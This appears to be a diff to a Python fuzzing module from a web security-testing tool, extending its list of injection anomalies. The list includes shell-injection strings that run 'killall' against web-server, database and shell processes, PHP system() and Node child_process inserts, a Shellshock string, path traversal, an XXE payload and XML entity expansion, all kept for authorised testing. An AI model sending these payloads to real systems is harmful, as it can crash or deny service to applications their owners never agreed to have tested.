@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+# pylint: disable=line-too-long
 """List of static anomalies that can be injected. Before using,
 replace mittn.org domain references with something you have control over.
 
@@ -9,6 +10,14 @@ to cause (any 5xx series) server error or a timeout. Alternatively,
 try to inject some greppable string (POSSIBLE_INJECTION_PROBLEM used
 here) that can potentially be caught by automated instrumentation at
 target.
+
+Trying to extract /etc/passwd, or something like that, may not trigger
+a client-side detection of a successful injection. Try to trigger
+reading from /dev/zero, /dev/random or some such place, sleep for a
+prolonged time, or kill a number of processes related to the web
+application stack. In these cases, you'd be more likely to cause at
+least a timeout.
+
 """
 
 anomaly_list = [
@@ -57,22 +66,25 @@ anomaly_list = [
     r'(?0)*',  # Infinite recursion (Perl)
 
     # Shell injection
-    r"`echo >injected.exe`",  # Backtick exec
-    r"| echo >injected.exe",  # Pipe exec
-    "../" * 15 + "etc/passwd",  # /etc/passwd
-    "`killall -g apache php nginx python perl node postgres`",  # Backtick exec
-    "| killall -g apache php nginx python perl node postgres",  # Pipe exec
+    r"`cat /dev/zero`",  # Backtick exec
+    r"| cat /dev/zero;",  # Pipe exec
+    "< /dev/zero;",  # stdin from /dev/zero
+    "> /dev/null;",  # Send output to /dev/null
+    "../" * 15 + "dev/zero",  # /etc/passwd
+    "`killall -g apache php nginx python perl node postgres bash`",  # Backtick exec
+    "| killall -g apache php nginx python perl node postgres bash;",  # Pipe exec
     "`ping localhost`",  # Backtick exec intended to cause a timeout
-    "' . `killall -g apache php nginx python perl node postgres` . '",  # Backtick exec, single quote PHP insert
-    '" . `killall -g apache php nginx python perl node postgres` . "',  # Backtick exec, double quote PHP insert
+    "' . `killall -g apache php nginx python perl node postgres bash` . '",  # Backtick exec, single quote PHP insert
+    '" . `killall -g apache php nginx python perl node postgres bash` . "',  # Backtick exec, double quote PHP insert
     "expect://killall%20-g%20apache%20php",  # A naïve try to leverage PHP's expect:// wrapper
     "ssh2.exec://localhost/killall%20-g%20apache%20php",  # A naïve try to leverage PHP's ssh2 wrapper
     "php://filter/resource=/dev/zero",  # A naïve try to leverage PHP's filter wrapper
     "compress.zlib:///dev/zero",  # A naïve try to leverage PHP's compression wrapper
     "glob://*",  # A naïve try to leverage PHP's glob wrapper
-    '" . system(\'killall -g apache php nginx python perl node postgres\'); . "',  # E.g. PHP system exec, double quote insert
-    "' . system(\'killall -g apache php nginx python perl node postgres\'); . '",  # E.g. PHP system exec, single quote insert
-    "var sys = require('sys'); sys.print('POSSIBLE_INJECTION_PROBLEM');",  # Node.js command injection
+    '" . system(\'killall -g apache php nginx python perl node postgres bash\'); . "',  # E.g. PHP system exec, double quote insert
+    "' . system(\'killall -g apache php nginx python perl node postgres bash\'); . '",  # E.g. PHP system exec, single quote insert
+    "require('assert').fail(0,1,'Node injection','');",  # Node.js command injection
+    "var sys = require('assert'); sys.fail(0,1,'Node injection','');",  # Node.js command injection,
     "var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
     "'; var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
     '() { :;}; exit',  # Shellshock: exit
@@ -84,13 +96,17 @@ anomaly_list = [
     '?>',  # End PHP block (or <?xml element for that matter)
     '<?php',  # Start PHP block
 
-    # URI injections
+    # URI injections (there are more above for PHP handlers)
     'javascript:sleep(1000000)',
     'data:text/plain;charset=utf-8;base64,UE9TU0lCTEVfSU5KRUNUSU9OX1BST0JMRU0=',
     'data:application/javascript;charset=utf-8;base64,c2xlZXAoMTAwMDAwMCkK',
     'data:text/html;charset=utf-8;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0PjwvaHRtbD4=',
     'tel:+358407531918',  # Likely not to have server side effect but can open a modal dialog on a client
     'sms:+358407531918',  # Likely not to have server side effect but can open a modal dialog on a client
+    'mailto:injections@mittn.org',
+    'netdoc:///dev/zero',  # Oracle Java pseudo-scheme
+    'jar:///dev/zero!/foo',  # Try to open as a zip file
+    'file:///dev/zero',
 
     # Stuff that tries to confuse broken OAuth processing
     'eyJhbGciOiJub25lIn0K.eyJyZnAiOiJtaXR0biIsCiJ0YXJnZXRfdXJpIjoiaHR0cDovL21pdHRuLm9yZyJ9Cg==.',  # A JWT state parameter
@@ -103,7 +119,9 @@ anomaly_list = [
 
     # Important numbers
     -1,
+    "-1",
     0,
+    "0",
     1,
     2,
     2 ** 8,
@@ -117,12 +135,15 @@ anomaly_list = [
     2 ** 128,
     -2 ** 128,
     2 ** 256,
+    str(2 ** 256),
     -2 ** 256,
+    str(-2 ** 256),
     1e-16,
     1e-32,
     '\n1',
     '1\n',
     2.2250738585072011e-308,  # CVE-2010-4645
+    "2.2250738585072011e-308",
     float('inf'),  # Infinity
     float('-inf'),  # Minus Infinity
     float('nan'),  # Not A Number
@@ -157,6 +178,7 @@ anomaly_list = [
     "\xff\xff",  # Illegal unicode as string
     '\t',  # tab
     '<?xml version="1.0"?><!DOCTYPE exp [ <!ENTITY exp "exp"><!ENTITY expa "' + '&exp;' * 100 + '"><!ENTITY expan "' + '&expa;' * 100 + '"><!ENTITY expand "' + '&expan;' * 100 + '"> ]><exp>&expand;</exp>',  # XML entity expansion,
+    '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///dev/zero">]><foo>&bar;</foo>',  # XML external entity inclusion
     'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x02\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON (invalid Boolean value)
     'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x06\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON 2 (embedded document length overflow)
     'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x03\x00\x00\x00\x00\x00\x00',  # Broken BSON 3 (string length overflow)
